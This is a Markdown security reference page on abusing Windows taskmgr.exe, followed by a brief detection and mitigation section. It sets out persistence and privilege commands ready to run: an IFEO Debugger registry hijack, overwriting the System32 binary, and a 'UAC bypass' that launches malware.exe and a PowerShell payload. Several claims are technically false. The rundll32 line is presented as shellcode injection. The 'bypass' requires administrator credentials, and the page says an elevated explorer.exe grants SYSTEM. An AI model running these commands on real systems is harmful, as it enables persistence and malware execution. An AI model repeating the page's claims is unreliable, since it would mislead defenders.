# taskmgr.exe
## What is it?
*```taskmgr.exe``` (Windows Task Manager) is a built-in Windows tool used to **monitor system performance**, **manage running processes**, **and terminate applications**.

## Legitimate Usage
- **Process Management** → View, start, or stop running applications and background processes.
- **Performance Monitoring** → Check CPU, memory, and network usage.
- **Startup Control** → Manage programs that launch at system startup.
- **User Management** → Log off, disconnect, or switch users.
*Since ```taskmgr.exe``` is a **trusted system process**, it is rarely flagged by security tools, making it an attractive target for attackers.*

## How to abuse it
- **Whitelisted Process** → Often allowed by application control policies.
- **Can Be Hijacked or Redirected** → Attackers can replace ```taskmgr.exe``` with a malicious binary.
- **Process Injection & Masquerading** → Used to hide or execute malicious payloads under a legitimate process.
- **Persistence via Registry Manipulation** → Task Manager execution can be redirected to launch malware.

## Example Attacks
### 1. Execution Hijacking via Image File Execution Options (IFEO)
*Attackers can modify Windows Registry to **redirect Task Manager execution** to another malicious binary.*

**Hijacking Task Manager Execution**
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "C:\malicious.exe" /f
```
*Every time Task Manager is opened, it will **launch ```malicious.exe``` instead**.*

### 2. Replacing Task Manager Executable (taskmgr.exe)
*Attackers with elevated privileges can replace ```taskmgr.exe``` with a **malicious version** to maintain persistence.*

**Replacing ```taskmgr.exe``` with a Malicious File**
```
takeown /f C:\Windows\System32\taskmgr.exe
icacls C:\Windows\System32\taskmgr.exe /grant administrators:F
copy C:\malware.exe C:\Windows\System32\taskmgr.exe /Y
```
*The system will launch ```malware.exe``` instead of the real Task Manager.*

### 3. Process Injection into Task Manager
*Attackers can **inject malicious code** into ```taskmgr.exe```, making it execute payloads while appearing legitimate.*

**Injecting Shellcode into Task Manager**
```
rundll32.exe shell32.dll,Control_RunDLL taskmgr.exe
```
*Executes ```taskmgr.exe``` while running injected shellcode in its memory space.*

### 4. Task Manager Used for UAC Bypass
*Attackers can leverage Task Manager to **restart ```explorer.exe``` with high privileges**, allowing them to **execute payloads with SYSTEM integrity**.*

**Steps to Perform UAC Bypass Using Task Manager**
1️⃣ **Kill ```explorer.exe``` via Task Manager**
*Manually terminate ```explorer.exe```*
```
taskkill /F /IM explorer.exe
```
*This will close the Windows desktop environment, forcing the user to restart it manually.*

2️⃣ **Launch Task Manager with Administrator Privileges**
*If running as a standard user, use ```runas``` to open an elevated Task Manager*
```
runas /user:Administrator "taskmgr.exe"
```
*This runs Task Manager in a high-integrity (administrator) context.*

3️⃣ **Restart Explorer with High Privileges**
*Once Task Manager is running **as an administrator**, restart ```explorer.exe``` from the **"File" → "Run new task" menu**, checking **"Create this task with administrative privileges"**.*
*Alternatively, run this command within an elevated Task Manager:*
```
cmd /c start explorer.exe
```
*```explorer.exe``` now runs with **administrator privileges**, allowing execution of any spawned processes as SYSTEM.*

4️⃣ **Execute Malicious Payload with SYSTEM Privileges**
*Now, any process launched via Explorer will **inherit SYSTEM integrity**.*
*To execute a payload (e.g., ```malware.exe```) with SYSTEM privileges:*
```
cmd /c start C:\malware.exe
```
*or*
```
powershell -ExecutionPolicy Bypass -NoProfile -File C:\payload.ps1
```
*The payload runs **with full administrative control**, bypassing UAC.*

# Detection & Mitigation
## Detection
**Monitor Unexpected Explorer Restarts**
- **Event ID 4688 (Process Creation)** → Detect ```explorer.exe``` launched from ```taskmgr.exe```
- **Sysmon Event ID 1 (Process Create)** → Look for ```taskmgr.exe``` executing ```cmd.exe``` or ```powershell.exe```

**Look for Elevated Task Manager Usage**
- **Event ID 4624 (Logon Events)** → Detect administrative logons
- **Monitor ```taskmgr.exe``` running with high privileges**

## Mitigation
- **Restrict Standard Users from Running Task Manager as Admin** → Use Group Policy to enforce access restrictions.
- **Block Unauthorized Explorer Restarts** → Alert on ```explorer.exe``` launching unexpectedly.
- **Use Application Control Policies** → Prevent unauthorized execution of scripts or binaries.
